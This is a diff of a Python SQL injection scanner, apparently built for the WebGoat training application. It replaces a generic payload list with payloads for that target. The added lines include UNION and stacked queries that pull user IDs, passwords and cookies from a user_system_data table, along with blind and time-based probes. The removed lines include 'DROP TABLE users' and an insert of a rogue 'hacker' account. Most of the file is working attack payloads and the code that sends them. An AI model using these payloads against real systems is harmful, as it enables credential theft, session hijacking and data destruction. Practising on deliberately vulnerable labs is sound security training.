@@ -1,38 +1,18 @@
 import requests
 import time
 
-# Expanded list of SQL Injection payloads based on OWASP Top 10 guidelines
+# Expanded list of SQL Injection payloads based on the WebGoat scenario
 SQL_PAYLOADS = [
-    # Error-based SQLi
-    "' OR '1'='1",  # Basic authentication bypass
-    "' OR '1'='1' --", 
-    "' OR '1'='1' /*",
-    "' OR 1=1 --",
-    "' OR 'x'='x",
-    "' OR ''='",
-    "' OR '1'='1' -- -",
-    "' OR 1=1; --",
-    "' OR '1'='1' ({",
-    "' OR 1=1#", 
-
-    # Union-based SQLi
-    "' UNION SELECT NULL, NULL--",
-    "' UNION SELECT 1, 'username' --",
-    "' UNION SELECT username, password FROM users--",
-    
-    # Time-based Blind SQLi
+    "' UNION SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data -- ",
+    "'; SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data --",
+    "' AND '1'='1",
+    "' AND '1'='0",
     "'; WAITFOR DELAY '0:0:5' --",
     "'; SELECT IF(1=1, SLEEP(5), 0)--",
     "' AND SLEEP(5)--",
     "' OR SLEEP(5) --",
-    
-    # Boolean-based Blind SQLi
-    "' AND '1'='1", 
-    "' AND '1'='0",
-    
-    # Stacked queries
-    "'; DROP TABLE users--",
-    "'; INSERT INTO users (username, password) VALUES ('hacker', 'pass')--"
+    "' OR '1'='1' --", 
+    "' OR 1=1 --"
 ]
 
 # List of expected SQL error messages to identify potential vulnerabilities
@@ -69,7 +49,7 @@ def scan_sql_injection(url, params, payloads=SQL_PAYLOADS, expected_errors=EXPEC
                 #print(f"Response Code: {response.status_code}")
                 #print(f"Response Text: {response.text[:500]}...")  # Print first 500 chars of the response
                 
-                # Check if response contains SQL errors
+                # Check if response contains SQL errors or abnormal behavior
                 if any(error in response.text.lower() for error in expected_errors):
                     vulnerabilities.append((param, payload, 'Error-based SQLi'))
                 
